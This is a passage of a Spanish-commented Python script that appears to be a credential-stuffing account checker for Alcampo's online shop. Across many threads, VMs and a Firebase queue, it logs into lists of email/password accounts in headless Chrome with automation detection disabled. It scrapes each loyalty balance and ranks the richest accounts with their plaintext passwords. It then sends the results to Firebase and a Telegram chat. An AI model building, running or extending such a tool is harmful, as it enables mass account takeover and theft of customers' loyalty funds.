                            cleaned_d = re.sub(r'<[^>]+>', ' ', driver_html)
                            cleaned_d = ' '.join(cleaned_d.split())
                            match_d2 = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_d)
                            if match_d2:
                                saldo = f"Tu Saldo es {match_d2.group(1)} €"
                    except Exception:
                        pass

                print(f"[Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
                break
                
            except Exception as e:
                print(f"[Hilo {thread_idx}] ❌ Error en {email} (Intento {intento}/{intentos_max}): {e}")
                # Cerrar driver en caso de error/congelación para forzar recreación
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = None
                if intento == intentos_max:
                    saldo = f"Error: {e}"
                    
        resultados.append({"email": email, "password": password, "saldo": saldo})
        
        # Update real-time progress state
        status = "error" if ("Error" in saldo or "No encontrado" in saldo) else "success"
        update_progress(thread_idx, email, status, saldo)
        
        # 7. Borrar cookies cross-domain vía CDP y localStorage para preparar siguiente cuenta
        if driver:
            try:
                driver.execute_cdp_cmd('Network.clearBrowserCookies', {})
                driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
            except Exception:
                # Si falla al limpiar, cerramos y forzamos recreación
                try:
                    driver.quit()
                except:
                    pass
                driver = None
                
    if driver:
        try:
            driver.quit()
        except:
            pass
            
    return resultados


def procesar_bloque_dinamico(worker_name, thread_idx):
    resultados = []
    driver = None
    
    def init_driver():
        nonlocal driver
        if driver:
            try:
                driver.quit()
            except:
                pass
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.page_load_strategy = "eager"
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        driver = webdriver.Chrome(
            service=Service(CHROME_DRIVER_PATH),
            options=chrome_options
        )
        driver.set_page_load_timeout(20)
        driver.implicitly_wait(1)

    acc_index = 0
    while True:
        if circuit_breaker.triggered:
            print(f"[{worker_name} Hilo {thread_idx}] 🛑 Circuit Breaker activado. Abortando consumo de cola.")
            break

        acc = claim_account_from_queue(f"{worker_name}_t{thread_idx}")
        if not acc:
            print(f"[{worker_name} Hilo {thread_idx}] 🎉 No quedan más cuentas en la cola dinámica de Firebase.")
            break

        acc_index += 1
        email = acc["email"]
        password = acc["password"]
        print(f"[{worker_name} Hilo {thread_idx}] → Procesando cuenta #{acc_index} de la Cola: {email}")
        
        intentos_max = 2
        saldo = "Error: Desconocido"
        
        for intento in range(1, intentos_max + 1):
            try:
                if not driver:
                    init_driver()
                
                # 1. Cargar login
                driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                wait = WebDriverWait(driver, 10)
                email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
                password_field = driver.find_element(By.ID, "pwd1")
                
                # 2. Rellenar credenciales y enviar
                email_field.send_keys(email)
                password_field.send_keys(password)
                password_field.send_keys(Keys.ENTER)
                
                # 3. Dynamic polling & redirect detection
                start_p = time.time()
                is_logged_in = False
                while time.time() - start_p < 8.0:
                    curr_url = driver.current_url
                    if "compraonline.alcampo.es" in curr_url and "login" not in curr_url and "my.site.com" not in curr_url:
                        is_logged_in = True
                        break
                    reset_elements = driver.find_elements(By.ID, "btnPwReset")
                    if reset_elements:
                        break
                    try:
                        p_html = driver.page_source
                        if "Call Center" in p_html or "bloqueada" in p_html or "incorrectos" in p_html:
                            break
                    except Exception:
                        pass
                    time.sleep(0.3)

                if not is_logged_in and ("login" in driver.current_url or "my.site.com" in driver.current_url or "authenticationError" in driver.current_url or "authentication" in driver.current_url):
                    # Check if cookies allow navigating directly despite authenticationError redirect
                    if "authenticationError" in driver.current_url or "authentication" in driver.current_url:
                        try:
                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                            time.sleep(1.2)
                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
                                is_logged_in = True
                        except Exception:
                            pass

                # If still not logged in AND authenticationError is detected -> RE-ATTEMPT LOGIN FORM IN SELENIUM
                curr_u = ""
                p_source = ""
                try:
                    curr_u = driver.current_url
                    p_source = driver.page_source
                except Exception:
                    pass

                if not is_logged_in and ("authenticationError" in curr_u or "authenticationError" in p_source or "authentication error" in p_source.lower()):
                    print(f"[{worker_name} Hilo {thread_idx}] 🔄 Redirección authenticationError en {email}. Re-intentando formulario de login...")
                    try:
                        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
                        wait_re = WebDriverWait(driver, 6)
                        e_field = wait_re.until(EC.presence_of_element_located((By.ID, "uname1")))
                        p_field = driver.find_element(By.ID, "pwd1")
                        e_field.send_keys(email)
                        p_field.send_keys(password)
                        p_field.send_keys(Keys.ENTER)
                        
                        start_re = time.time()
                        while time.time() - start_re < 6.0:
                            c_url = driver.current_url
                            if "compraonline.alcampo.es" in c_url and "login" not in c_url and "my.site.com" not in c_url and "authenticationError" not in c_url:
                                is_logged_in = True
                                break
                            time.sleep(0.3)
                            
                        if not is_logged_in:
                            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                            time.sleep(1.2)
                            if "settings/loyalty" in driver.current_url and "login" not in driver.current_url and "authenticationError" not in driver.current_url:
                                is_logged_in = True
                    except Exception:
                        pass

                if not is_logged_in:
                    page_html = p_source or ""
                    curr_url_check = curr_u or ""
                    try:
                        if not page_html:
                            page_html = driver.page_source
                        if not curr_url_check:
                            curr_url_check = driver.current_url
                    except Exception:
                        pass
                    if "Tu cuenta ha sido bloqueada" in page_html or "Call Center" in page_html:
                        saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
                    elif "Usuario o contraseña incorrectos" in page_html or "Credenciales incorrectas" in page_html:
                        saldo = "Error: Credenciales incorrectas"
                    elif "authenticationError" in curr_url_check or "authenticationError" in page_html or "authentication error" in page_html.lower():
                        saldo = "Error: authenticationError"
                    else:
                        saldo = "Error: Bloqueo/Timeout"
                    print(f"[{worker_name} Hilo {thread_idx}] 🔴 {email} → {saldo}")
                    is_down, reason = circuit_breaker.is_server_down_error(page_source=page_html, error_msg=saldo)
                    triggered, trigger_reason = circuit_breaker.record_result(is_down, reason)
                    if triggered:
                        print(f"🚨 [CIRCUIT BREAKER DISPARADO] {trigger_reason}. Abortando {worker_name} hilo {thread_idx}.")
                        break
                    break
                    
                # 4. Obtener cookies de la sesión
                cookies = driver.get_cookies()
                user_agent = driver.execute_script("return navigator.userAgent;")
                
                # 5. Hacer petición HTTP con requests para el saldo
                session = requests.Session()
                for cookie in cookies:
                    name = cookie['name']
                    val = cookie['value']
                    try:
                        name.encode('latin-1')
                    except UnicodeEncodeError:
                        name = name.encode('utf-8').decode('latin-1')
                    try:
                        val.encode('latin-1')
                    except UnicodeEncodeError:
                        val = val.encode('utf-8').decode('latin-1')
                    session.cookies.set(name, val)
                    
                headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
                }
                
                res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
                if res.status_code != 200:
                    raise Exception(f"HTTP Error {res.status_code}")
                    
                # 6. Parsear saldo usando regex
                saldo = "No encontrado"
                match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
                if match:
                    saldo = f"Tu Saldo es {match.group(1)} €"
                else:
                    cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
                    cleaned_text = ' '.join(cleaned_text.split())
                    match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
                    if match_text:
                        saldo = f"Tu Saldo es {match_text.group(1)} €"
                    else:
                        match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                        if match_alt:
                            saldo = f"Tu Saldo es {match_alt.group(1)} €"
                
                # Fallback Chrome directo si el HTTP request dio authenticationError o no encontró saldo
                if "Tu Saldo es" not in saldo and driver:
                    try:
                        driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
                        time.sleep(1.2)
                        driver_html = driver.page_source
                        match_driver = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", driver_html)
                        if match_driver:
                            saldo = f"Tu Saldo es {match_driver.group(1)} €"
                        else:
                            cleaned_d = re.sub(r'<[^>]+>', ' ', driver_html)
                            cleaned_d = ' '.join(cleaned_d.split())
                            match_d2 = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_d)
                            if match_d2:
                                saldo = f"Tu Saldo es {match_d2.group(1)} €"
                    except Exception:
                        pass

                print(f"[{worker_name} Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
                break
                
            except Exception as e:
                print(f"[{worker_name} Hilo {thread_idx}] ❌ Error en {email} (Intento {intento}/{intentos_max}): {e}")
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = None
                if intento == intentos_max:
                    saldo = f"Error: {e}"
                    
        resultados.append({"email": email, "password": password, "saldo": saldo})
        status = "error" if ("Error" in saldo or "No encontrado" in saldo) else "success"
        update_progress(thread_idx, email, status, saldo)
        
        if driver:
            try:
                driver.execute_cdp_cmd('Network.clearBrowserCookies', {})
                driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
            except Exception:
                try:
                    driver.quit()
                except:
                    pass
                driver = None
                
    if driver:
        try:
            driver.quit()
        except:
            pass
            
    return resultados


def limpiar_saldo(saldo_str):
    if saldo_str is None:
        return None
    texto = str(saldo_str).strip()
    if not texto or "Error" in texto or "No encontrado" in texto:
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
    if not match:
        return None
    limpio = match.group(0).replace(',', '.')
    try:
        return float(limpio)
    except ValueError:
        return None


def main():
    args = parse_args()
    
    if args.check_single:
        email, password = args.check_single
        print(f"🔎 Iniciando comprobación de saldo individual para: {email}")
        # Read existing card number from env (passed by dashboard to skip scraping)
        existing_card = os.environ.get("EXISTING_CARD_NUMBER") or None
        if existing_card:
            print(f"ℹ️ Número de tarjeta ya conocido ({existing_card}), se omitirá el scraping del portal.")
        res = check_single_account(email, password, scrape_card=True, existing_card_number=existing_card)
        print(f"Resultado: {res}")
        
        # Safe update to Firebase RTDB and local top_accounts.json
        firebase_url = get_firebase_url()
        
        # 1. Update in Firebase if URL is set
        if firebase_url:
            try:
                # Sanitize email for Firebase keys
                email_sanitized = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
                
                # Update single check result node
                check_id = os.environ.get("CHECK_ID")
                payload = {
                    "email": email,
                    "balance": res["balance"],
                    "card_number": res["card_number"],
                    "status": res["status"],
                    "error": res["error"],
                    "timestamp": time.time()
                }
                if check_id:
                    payload["check_id"] = check_id
                url = firebase_url.strip().rstrip('/') + f"/single_check_result/{email_sanitized}.json"
                requests.put(url, json=payload, timeout=5)

                
                # Update in /top_accounts.json if it is already there
                if res["status"] == "success":
                    top_url = firebase_url.strip().rstrip('/') + "/top_accounts.json"
                    top_res = requests.get(top_url, timeout=5)
                    if top_res.ok:
                        top_accounts = top_res.json()
                        if isinstance(top_accounts, list):
                            updated = False
                            for acc in top_accounts:
                                if acc.get("email") == email:
                                    acc["balance"] = res["balance"]
                                    if res["card_number"]:
                                        acc["card_number"] = res["card_number"]
                                    updated = True
                            if updated:
                                requests.put(top_url, json=top_accounts, timeout=5)
            except Exception as e:
                print(f"Error actualizando Firebase: {e}")
        
        # 2. Update local top_accounts.json if the account is in it
        if res["status"] == "success":
            try:
                top_local_path = ROOT.parent / "docs" / "top_accounts.json"
                if top_local_path.exists():
                    with open(top_local_path, "r", encoding="utf-8") as f:
                        top_accounts = json.load(f)
                    if isinstance(top_accounts, list):
                        updated = False
                        for acc in top_accounts:
                            if acc.get("email") == email:
                                acc["balance"] = res["balance"]
                                if res["card_number"]:
                                    acc["card_number"] = res["card_number"]
                                updated = True
                        if updated:
                            with open(top_local_path, "w", encoding="utf-8") as f:
                                json.dump(top_accounts, f, indent=4)
                            print(f"✔ top_accounts.json local actualizado.")
            except Exception as e:
                print(f"Error actualizando top_accounts.json local: {e}")
                
        # Also update accounts.json if a card number was successfully found/updated!
        if res["status"] == "success" and res["card_number"]:
            try:
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                    accounts = json.load(f)
                updated = False
                for acc in accounts:
                    if acc.get("email") == email:
                        acc["card_number"] = res["card_number"]
                        updated = True
                        break
                if updated:
                    with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
                        json.dump(accounts, f, indent=2)
                    print(f"✔ accounts.json actualizado con número de tarjeta.")
            except Exception as e:
                print(f"Error actualizando accounts.json: {e}")
                
        sys.exit(0 if res["status"] == "success" else 1)
    
    # Telegram config (robust parsing with fallbacks)
    telegram_token, chat_id = get_telegram_config()
    send_telegram = args.send_telegram and not args.no_telegram

    # Cargar cuentas desde input-file o ACCOUNTS_FILE por defecto
    target_accounts_path = Path(args.input_file) if args.input_file else ACCOUNTS_FILE
    if not target_accounts_path.exists():
        print(f"❌ Error: No se encuentra {target_accounts_path}")
        sys.exit(1)
        
    with open(target_accounts_path, "r", encoding="utf-8") as f:
        accounts = json.load(f)

    # 1. Modo Inicialización de Cola Dinámica en Firebase
    if args.init_queue:
        print(f"📋 Cargando {len(accounts)} cuentas para inicializar Cola Dinámica en Firebase...")
        init_firebase_queue(accounts)
        sys.exit(0)

    # 2. Modo Consumo de Cola Dinámica en Firebase (Work-Stealing)
    if args.use_queue:
        worker_label = f"VM_{args.shard_id}" if args.shard_id is not None else "Worker"
        print(f"🚀 [COLA DINÁMICA FIREBASE] {worker_label} arrancando {args.threads} hilos dinámicos...")
        init_progress(len(accounts))
        num_threads = max(1, args.threads)
        resultados = []
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {
                executor.submit(procesar_bloque_dinamico, worker_label, i + 1): i
                for i in range(num_threads)
            }
            for future in as_completed(futures):
                resultados.extend(future.result())
                
        end_time = time.time()
        duration = end_time - start_time
        
        target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
        import pandas as pd
        df = pd.DataFrame(resultados)
        df.to_excel(target_excel_path, index=False)
        print(f"\n💾 Resultados de Cola Dinámica guardados en: {target_excel_path}")
        print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
        sys.exit(0)

    # Filtrar por Modulo Shard si se especifican --shard-id y --total-shards
    if args.shard_id is not None and args.total_shards is not None:
        accounts = [acc for i, acc in enumerate(accounts) if i % args.total_shards == args.shard_id]
        print(f"ℹ️ Modo Matriz (Módulo): Shard {args.shard_id}/{args.total_shards} -> {len(accounts)} cuentas asignadas.")
    elif args.start_index is not None and args.limit is not None:
        accounts = accounts[args.start_index:args.start_index + args.limit]
        print(f"ℹ️ Modo Rango: Desde {args.start_index} limit {args.limit} -> {len(accounts)} cuentas asignadas.")
    elif args.limit:
        accounts = accounts[:args.limit]
        print(f"ℹ️ Modo prueba: Limitado a las primeras {args.limit} cuentas.")

    # Initialize progress files
    init_progress(len(accounts))

    # Repartir cuentas equitativamente entre los hilos
    num_threads = min(args.threads, len(accounts))
    if num_threads == 0:
        num_threads = 1
        
    chunks = [[] for _ in range(num_threads)]
    for i, acc in enumerate(accounts):
        chunks[i % num_threads].append(acc)

    print(f"🚀 Iniciando verificación de {len(accounts)} cuentas repartidas en {num_threads} hilos (reutilizando navegadores)...")
    
    if send_telegram:
        try:
            enviar_telegram_texto(telegram_token, chat_id,
                f"🚀 <b>Iniciando ejecución Alcampo</b>\n\n"
                f"📋 Cuentas a procesar: {len(accounts)}\n"
                f"⚙️ Hilos: {num_threads}\n\n"
                f"👀 <b>Ver en tiempo real:</b>\n"
                f"https://programacion1-sigma.vercel.app"
            )
        except Exception as e:
            print(f"Error enviando mensaje inicial a Telegram: {e}")
            
    resultados = []
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {
            executor.submit(procesar_bloque, chunks[i], i + 1): i
            for i in range(num_threads)
        }
        for future in as_completed(futures):
            resultados.extend(future.result())
            
    end_time = time.time()
    duration = end_time - start_time
    
    # Guardar Excel
    import pandas as pd
    target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
    df = pd.DataFrame(resultados)
    df.to_excel(target_excel_path, index=False)
    print(f"\n💾 Resultados guardados en: {target_excel_path}")
    print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
    
    # Resumen
    saldo_total = 0.0
    cuentas_con_saldo = 0
    cuentas_saldo_cero = 0
    cuentas_error = 0
    cuentas_ranked = []  # List of (valor, email, password) for ranking
    
    for r in resultados:
        valor = limpiar_saldo(r.get("saldo"))
        if valor is None:
            cuentas_error += 1
            continue
        saldo_total += valor
        if valor > 0:
            cuentas_con_saldo += 1
            cuentas_ranked.append((valor, r["email"], r.get("password", "")))
        elif valor == 0:
            cuentas_saldo_cero += 1

    # Sort by balance descending and take top 10
    cuentas_ranked.sort(key=lambda x: x[0], reverse=True)
    top_10 = cuentas_ranked[:10]
    
    top_10_text = "\n".join(
        f"   {i+1}. {html.escape(email)} ({val:.2f} €)"
        for i, (val, email, _) in enumerate(top_10)
    ) if top_10 else "   N/A"
            
    mensaje_resumen = (
        f"📊 <b>RESUMEN ALCAMPO OPTIMIZADO</b>\n\n"
        f"✅ Cuentas procesadas: {len(resultados)}\n"
        f"⏱️ Tiempo empleado: {duration/60:.2f} min\n"
        f"💰 <b>Saldo Total:</b> {saldo_total:.2f} €\n"
        f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
        f"💤 Cuentas con saldo 0: {cuentas_saldo_cero}\n"
        f"⚠️ Cuentas con error/sin saldo: {cuentas_error}\n\n"
        f"🏆 <b>Top 10 Cuentas:</b>\n{top_10_text}"
    )
    
    print("\n" + mensaje_resumen)
    
    # Push top 10 accounts locally and to Firebase for real-time dashboard display
    if top_10:
        try:
            card_map = {acc["email"]: acc.get("card_number") for acc in accounts if "email" in acc}
            top_accounts_data = [
                {"email": email, "password": pwd, "balance": val, "card_number": card_map.get(email)}
                for val, email, pwd in top_10
            ]
            # Always save locally
            try:
                top_local_path = ROOT.parent / "docs" / "top_accounts.json"
                # Ensure docs folder exists
                top_local_path.parent.mkdir(parents=True, exist_ok=True)
                with open(top_local_path, "w", encoding="utf-8") as f:
                    json.dump(top_accounts_data, f, indent=4)
                print(f"✔ top_accounts.json local guardado en {top_local_path}")
            except Exception as e:
                print(f"Error escribiendo top_accounts.json local: {e}")

            # Save to Firebase if configured
            firebase_url = get_firebase_url()
            if firebase_url:
                url = firebase_url.strip().rstrip('/') + "/top_accounts.json"
                requests.put(url, json=top_accounts_data, timeout=5)
                print(f"✔ top_accounts.json enviado a Firebase.")
        except Exception as e:
            print(f"Error al exportar Top 10 cuentas: {e}")
    
    if send_telegram:
        enviar_telegram_texto(telegram_token, chat_id, mensaje_resumen)
        enviar_telegram_documento(
            telegram_token, 
            chat_id, 
            EXCEL_FILE, 
            caption="📊 Reporte de saldos de cuentas Alcampo"
        )
        print("🎉 Proceso completo y enviado a Telegram.")
    else:
        print("ℹ️ Envío a Telegram desactivado. Usa el script sin --no-telegram para activarlo.")


if __name__ == "__main__":
    main()
